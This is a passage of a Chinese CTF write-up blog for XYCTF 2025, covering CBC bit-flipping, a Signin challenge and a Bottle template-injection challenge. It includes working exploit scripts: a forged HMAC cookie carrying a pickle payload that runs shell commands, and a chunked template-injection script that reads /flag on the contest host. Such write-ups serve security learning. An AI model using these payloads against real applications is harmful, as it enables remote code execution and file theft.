class="token punctuation">,</span>        <span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        html_template <span class="token operator">=</span> <span class="token punctuation">(</span>            <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;title&gt;Home&lt;/title&gt;    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"&gt;    &lt;link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}"&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class="container"&gt;        &lt;h2 class="text-center"&gt;server code (encoded)&lt;/h2&gt;        &lt;div class="text-center" style="word-break:break-all;"&gt;        {%% raw %%}            %s        {%% endraw %%}        &lt;/div&gt;        &lt;div class="text-center"&gt;            &lt;a href="/logout" class="btn btn-danger"&gt;Logout&lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;"""</span>            <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html_template<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/csu_vc/article/details/79619309">CBC翻转攻击，了解一下！_比特反转攻击主要针对什么算法-CSDN博客</a></p><pre class="line-numbers language-none"><code class="language-none">gk5DBBi8JHP7WXALb+BgNynC9tZAsIibebHJnHE5/aqOPk37gUHdY6ykykCDRfUDzslFDFzDLA7RVYXh7e7ae3pkZyRLCcekU6w6YIMMOhu1xPBw1nW/xWoldRJd0RF0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ce9599cff515ed6dfe9c75f167696f29.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3d30b9051aef25fdbc0b75c54e350091.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7ab4b3db016c350938e8213b73233fb8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xyctf</title>
      <link href="/2025/04/18/sign/"/>
      <url>/2025/04/18/sign/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/LAMENTXU/articles/18730353">XYCTF 2025 出题人wp LamentXU - LamentXU - 博客园</a></p><p><a href="https://kc1zs4.github.io/2025/04/07/XYCTF25/#fate-%E5%A4%8D%E7%8E%B0-SV">XYCTF25</a></p><p><a href="https://cdisk.imxbt.cn/s/jRfM/pdf?name=XYCTF2025-%E5%AE%98%E6%96%B9WP.pdf&amp;share_path=/wp/XYCTF2025-%E5%AE%98%E6%96%B9WP.pdf">XYCTF2025-官方WP.pdf - SfTian</a></p><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p><a href="https://blog.csdn.net/whieenz/article/details/83070038">https://blog.csdn.net/whieenz/article/details/83070038</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3f1e9aa002701f965c86701bcd4deb08.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Cookie<span class="token punctuation">:</span> name<span class="token operator">=</span><span class="token string">"!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu"</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> pickle <span class="token keyword">import</span> loads<span class="token keyword">import</span> hmac<span class="token keyword">import</span> hashlib<span class="token comment"># 解码数据部分（需补全 Base64 填充）</span>encoded_data <span class="token operator">=</span> <span class="token string">"gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu"</span>decoded_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>encoded_data <span class="token operator">+</span> <span class="token string">"=="</span><span class="token punctuation">)</span>  <span class="token comment"># 补全填充</span><span class="token comment"># 反序列化</span>session <span class="token operator">=</span> loads<span class="token punctuation">(</span>decoded_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后的会话内容:"</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span>secret <span class="token operator">=</span> <span class="token string">"Hell0_H@cker_Y0u_A3r_Sm@r7"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>data_part <span class="token operator">=</span> <span class="token string">"gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu"</span>  <span class="token comment"># 数据部分</span>provided_signature <span class="token operator">=</span> <span class="token string">"4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek="</span><span class="token comment"># 计算签名</span>expected_signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>    hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data_part<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"预期签名:"</span><span class="token punctuation">,</span> expected_signature<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"实际签名:"</span><span class="token punctuation">,</span> provided_signature<span class="token punctuation">)</span>解密后的会话内容<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">}</span><span class="token punctuation">]</span>预期签名<span class="token punctuation">:</span> 4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek<span class="token operator">=</span>实际签名<span class="token punctuation">:</span> 4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照解密写加密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> hmac<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64secret <span class="token operator">=</span> <span class="token string">"Hell0_H@cker_Y0u_A3r_Sm@r7"</span>session <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token comment"># 1. 使用pickle序列化会话数据</span>serialized <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 2. Base64编码序列化数据</span>encoded_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 3. 使用HMAC-SHA256生成签名</span>key <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>signature <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> encoded_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>encoded_sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>signature<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 4. 组合最终Cookie值（格式：!签名.数据）</span>forged_cookie <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"!</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_sig<span class="token punctuation">}</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_data<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"伪造的管理员 Cookie: name=</span><span class="token interpolation"><span class="token punctuation">{</span>forged_cookie<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到<code>pickle.dumps</code>，明白考点与[GHCTF 2025]ezzzz_pickle一样。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hmac<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64secret <span class="token operator">=</span> <span class="token string">"Hell0_H@cker_Y0u_A3r_Sm@r7"</span>opcode <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''(cossystemS'ls / &gt; ../../secret.txt'o.'''</span><span class="token comment">#cat /flag_dda2d465-af33-4c56-8cc9-fd4306867b70 &gt; ../../secret.txt</span>encoded_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 生成HMAC签名</span>signature <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>    secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    encoded_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>encoded_sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>signature<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 使用正确分隔符组合</span>forged_cookie <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"!</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_sig<span class="token punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_data<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"伪造的管理员 Cookie: name=</span><span class="token interpolation"><span class="token punctuation">{</span>forged_cookie<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4aafe3648ed4d5fe1e352215d9094799.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/faa632056726812bd8c841b63a998ecf.png"></p><p>ps:我用反弹shell没成功，不知道是啥原因，有无师傅用反弹shell做的？</p><hr><p><del>好了另一个师傅也没弹成功，那应该是不出网（</del></p><hr><h3 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h3><p>看着很像hgane[Level 24 Pacman]的前端小游戏。</p><p>ban了鼠标右键和f12:</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/29fffbfa3debb0798b3a89ae527ad2a0.png"></p><p><a href="https://learn.microsoft.com/zh-cn/microsoft-edge/devtools-guide-chromium/javascript/guides/mark-content-scripts-library-code">将内容脚本添加到忽略列表 - Microsoft Edge Developer documentation | Microsoft Learn</a></p><p><a href="https://www.freebuf.com/articles/others-articles/181085.html">Windows下反反调试技术汇总 - FreeBuf网络安全行业门户</a></p><p>会触发程序的反调试，右键+添加脚本以忽略列表-&gt;程序停止但也不能调试了。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/399e7c0bd267a051b4a86252381d8256.png"></p><p>目标是找时间相关的，搜索<code>time</code></p><p>在控制台将初始时间调大</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6db42c37867e8753cf6ee35dd48faa46.png"></p><hr><h3 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h3><blockquote><p>由于python的特性，我们可以将变量赋值给os模块中的属性，这个属性可以是自己新定义的，比如像这样</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os  设置环境变量  os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'MY_VARIABLE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'some_value'</span>  获取环境变量  <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'MY_VARIABLE'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出: some_value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- encoding: utf-8 -*-</span><span class="token triple-quoted-string string">'''@File    :   app.py@Time    :   2025/03/29 15:52:17@Author  :   LamentXU '''</span><span class="token keyword">import</span> bottle<span class="token triple-quoted-string string">'''flag in /flag'''</span><span class="token decorator annotation punctuation">@bottle<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello, World!'</span><span class="token decorator annotation punctuation">@bottle<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/attack'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> bottle<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> payload <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">25</span> <span class="token keyword">and</span> <span class="token string">'open'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> payload <span class="token keyword">and</span> <span class="token string">'\\'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> payload<span class="token punctuation">:</span>        <span class="token keyword">return</span> bottle<span class="token punctuation">.</span>template<span class="token punctuation">(</span><span class="token string">'hello '</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        bottle<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">'Invalid payload'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    bottle<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>切片操作能够从一个序列（像字符串、列表、元组等）中提取出一部分元素，从而生成一个新的序列。切片操作借助方括号 <code>[]</code> 和冒号 <code>:</code> 来实现。</p><p><code>range(0, len(payload), 3)</code></p><ul><li><code>range</code> 函数用于生成一个整数序列。</li><li><code>0</code> 是起始值，意味着序列从 0 开始。</li><li><code>len(payload)</code> 是结束值，也就是序列到 <code>payload</code> 字符串的长度（但不包含该长度值）为止。</li><li><code>3</code> 是步长，表明序列中的每个整数之间相差 3。</li></ul><p>例如，若 <code>payload = "abcdef"</code>，那么 <code>range(0, len(payload), 3)</code> 会生成序列 <code>[0, 3]</code>。</p><ol start="2"><li><code>payload[i:i+3]</code></li></ol><ul><li><code>payload</code> 是一个字符串。</li><li><code>i</code> 是 <code>range</code> 函数生成的整数。</li><li><code>payload[i:i+3]</code> 是对字符串进行切片操作，从索引 <code>i</code> 开始，到索引 <code>i+3</code> 结束（不包含索引 <code>i+3</code> 处的字符）。</li></ul><p>例如，若 <code>payload = "abcdef"</code>，当 <code>i = 0</code> 时，<code>payload[i:i+3]</code> 就是 <code>"abc"</code>；当 <code>i = 3</code> 时，<code>payload[i:i+3]</code> 就是 <code>"def"</code>。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://gz.imxbt.cn:20310/attack'</span>payload <span class="token operator">=</span> <span class="token string">"__import__('os').system('cat /flag&gt;qing')"</span>p <span class="token operator">=</span> <span class="token punctuation">[</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token boolean">True</span><span class="token keyword">for</span> i <span class="token keyword">in</span> p<span class="token punctuation">:</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'\n% import os;os.a="</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">"'</span></span>        flag <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'\n% import os;os.a+="</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">"'</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"payload"</span><span class="token punctuation">:</span> tmp<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"\n% import os;eval(os.a)"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"\n% include('qing')"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>hello flag<span class="token punctuation">{</span>L@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h3><blockquote><p>在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/76422e94f16c00ca5576265644e81629.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> flask<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>blacklist <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token keyword">def</span> <span class="token function">binary_to_string</span><span class="token punctuation">(</span>binary_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>binary_string<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Binary string length must be a multiple of 8"</span><span class="token punctuation">)</span>    binary_chunks <span class="token operator">=</span> <span class="token punctuation">[</span>binary_string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>binary_string<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    string_output <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> chunk <span class="token keyword">in</span> binary_chunks<span class="token punctuation">)</span>        <span class="token keyword">return</span> string_output<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">nolettersproxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">'No URL provided'</span><span class="token punctuation">)</span>        target_url <span class="token operator">=</span> <span class="token string">"http://lamentxu.top"</span> <span class="token operator">+</span> url    <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> url<span class="token punctuation">:</span>            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token string">'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"."</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token string">'No ssrf allowed'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">db_search</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'database.db'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token 